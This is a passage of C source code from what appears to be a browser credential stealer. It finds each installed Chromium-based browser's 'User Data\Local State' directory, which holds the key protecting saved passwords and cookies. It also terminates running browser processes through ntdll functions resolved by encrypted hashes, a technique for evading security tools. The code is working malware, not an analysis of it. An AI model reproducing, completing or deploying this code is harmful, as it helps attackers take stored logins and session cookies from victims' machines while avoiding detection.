            if (!last_slash) last_slash = strrchr(exe_dir, '/');
            if (!last_slash) { idx++; continue; }
            *last_slash = 0;

            /* ── Probe <exe_dir>\User Data\Local State ────────── */
            char probe[1024];
            snprintf(probe, sizeof(probe),
                     "%s\\User Data\\Local State", exe_dir);
            if (!file_exists(probe)) {
                /* Try one level up (e.g. Chrome\Application → Chrome) */
                char parent_dir[1024];
                strncpy(parent_dir, exe_dir, sizeof(parent_dir) - 1);
                parent_dir[sizeof(parent_dir) - 1] = 0;
                char *ps = strrchr(parent_dir, '\\');
                if (!ps) ps = strrchr(parent_dir, '/');
                if (ps) {
                    *ps = 0;
                    snprintf(probe, sizeof(probe),
                             "%s\\User Data\\Local State", parent_dir);
                    if (!file_exists(probe)) {
                        /* Try %LOCALAPPDATA% derived path */
                        char *env_local = getenv("LOCALAPPDATA");
                        if (env_local) {
                            snprintf(probe, sizeof(probe),
                                     "%s\\%s\\User Data\\Local State",
                                     env_local, basename_of(parent_dir));
                            if (!file_exists(probe)) {
                                idx++;
                                continue;
                            }
                            /* Build path_suffix relative to LOCALAPPDATA */
                            snprintf(probe, sizeof(probe),
                                     "%s\\User Data",
                                     basename_of(parent_dir));
                        } else {
                            idx++;
                            continue;
                        }
                    } else {
                        snprintf(probe, sizeof(probe),
                                 "%s\\User Data", parent_dir);
                    }
                } else {
                    idx++;
                    continue;
                }
            } else {
                snprintf(probe, sizeof(probe),
                         "%s\\User Data", exe_dir);
            }

            /* ── Dedup by resolved path ───────────────────────── */
            if (bp_path_exists(out, *count, probe)) {
                idx++;
                continue;
            }
            /* Also check against static table */
            if (bp_path_exists(browsers, 58, probe)) {
                idx++;
                continue;
            }

            /* ── Derive browser name from exe ─────────────────── */
            char *exe_name = (char *)basename_of(exe_path);
            char browser_name[256];
            strncpy(browser_name, exe_name, sizeof(browser_name) - 1);
            browser_name[sizeof(browser_name) - 1] = 0;
            /* Strip .exe extension */
            size_t bn_len = strlen(browser_name);
            if (bn_len > 4 && _stricmp(browser_name + bn_len - 4, ".exe") == 0)
                browser_name[bn_len - 4] = 0;

            /* ── Add entry ────────────────────────────────────── */
            if (*count < max_out) {
                out[*count].name         = strdup(browser_name);
                out[*count].path_suffix  = strdup(probe);
                out[*count].use_roaming  = 0;
                out[*count].process_name = out[*count].name; /* exe stem */
                (*count)++;
            }

            idx++;
        }

        fnClose(key);
    }

    return 0;
}

/* ════════════════════════════════════════════════════════════════ *
 *  kill_browser_processes — NtGetNextProcess + NtTerminateProcess  *
 * ════════════════════════════════════════════════════════════════ */

#ifdef ENABLE_KILL_BROWSERS

/* All NT functions resolved from ntdll via PEB-walk — no engine.h needed */
typedef NTSTATUS (*fnNtGetNextProcess)(HANDLE, ULONG, ULONG, ULONG, HANDLE *);
typedef NTSTATUS (*fnNtTerminateProcess)(HANDLE, NTSTATUS);
typedef NTSTATUS (*fnNtClose)(HANDLE);
typedef NTSTATUS (*fnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, ULONG *);

/* ProcessImageFileName — kernel fills a UNICODE_STRING with the NT path */
#define ProcessImageFileName  27

#define DESIRED_ACCESS (0x0400 | 0x0001)  /* PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE */

/* Case-insensitive compare of a wide-char stem (no ext) against narrow target.
 * Both are compared lowercased; stops at L'\0' / '\0'. */
static int stem_match_ci(const WCHAR *wname, int wlen, const char *target)
{
    for (int i = 0; i < wlen; i++) {
        WCHAR wc = wname[i];
        char  tc = target[i];
        if (wc >= L'A' && wc <= L'Z') wc += 32;
        if (tc >= 'A'   && tc <= 'Z')  tc += 32;
        if ((char)wc != tc) return 0;
        if (tc == '\0')    return 0;  /* target shorter */
    }
    return target[wlen] == '\0';  /* target must be same length */
}

int kill_browser_processes(const char *process_name)
{
    if (!process_name) return 0;

    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
    if (!ntdll) return 0;

    fnNtGetNextProcess pGetNext =
        (fnNtGetNextProcess)mirage_get_function_by_hash(
            ntdll, mirage_encrypted_hash_func("NtGetNextProcess"));
    fnNtTerminateProcess pTerm =
        (fnNtTerminateProcess)mirage_get_function_by_hash(
            ntdll, mirage_encrypted_hash_func("NtTerminateProcess"));
    fnNtClose pClose =
        (fnNtClose)mirage_get_function_by_hash(
            ntdll, mirage_encrypted_hash_func("NtClose"));
    fnNtQueryInformationProcess pQIP =
        (fnNtQueryInformationProcess)mirage_get_function_by_hash(
            ntdll, mirage_encrypted_hash_func("NtQueryInformationProcess"));
    if (!pGetNext || !pTerm || !pClose || !pQIP) return 0;

    int killed = 0;
    HANDLE h = NULL;

    for (;;) {
        HANDLE next = NULL;
        NTSTATUS st = pGetNext(h, DESIRED_ACCESS, 0, 0, &next);
        if (h) pClose(h);
        if (st == STATUS_NO_MORE_ENTRIES) break;
        if (st < 0) { h = NULL; break; }
        h = next;

        /* Query image name. Kernel allocates UNICODE_STRING.Buffer; acceptable
         * leak — process exits shortly and OS reclaims all memory. */
        UNICODE_STRING img = {0, 0, NULL};
        st = pQIP(h, ProcessImageFileName, &img, sizeof(UNICODE_STRING), NULL);
        if (st < 0 || !img.Buffer || img.Length == 0) continue;

        /* Extract filename after last backslash */
        const WCHAR *name = img.Buffer;
        int nlen = img.Length / (int)sizeof(WCHAR);
        {
            int last_slash = -1;
            for (int i = 0; i < nlen; i++)
                if (img.Buffer[i] == L'\\') last_slash = i;
            if (last_slash >= 0) {
                name  = img.Buffer + last_slash + 1;
                nlen -= last_slash + 1;
            }
        }
        if (nlen <= 0) continue;

        /* Strip .exe extension */
        int stem = nlen;
        if (stem > 4) {
            const WCHAR *ext = name + stem - 4;
            if ((ext[0] == L'.') &&
                (ext[1] == L'e' || ext[1] == L'E') &&
                (ext[2] == L'x' || ext[2] == L'X') &&
                (ext[3] == L'e' || ext[3] == L'E'))
                stem -= 4;
        }

        if (!stem_match_ci(name, stem, process_name)) continue;

        /* Terminate; silently skip STATUS_ACCESS_DENIED (st < 0) */
        st = pTerm(h, 0);
        if (st >= 0) killed++;
    }
    if (h) pClose(h);
    return killed;
}

#endif /* ENABLE_KILL_BROWSERS */
